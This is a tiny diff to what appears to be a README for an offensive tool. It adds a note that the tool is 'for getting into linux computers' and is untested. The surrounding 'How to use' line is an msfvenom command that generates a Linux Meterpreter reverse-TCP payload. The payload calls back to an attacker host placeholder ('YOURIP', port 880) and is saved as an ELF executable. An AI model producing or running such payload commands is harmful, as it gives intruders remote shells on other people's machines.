@@ -1,3 +1,5 @@
+### Note this is for getting into linux computers this will not work on a windows computer. Also this has not been tested so may work or may not
+
 ## How to use:
 
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOURIP LPORT=880 -f elf > mShell_880`
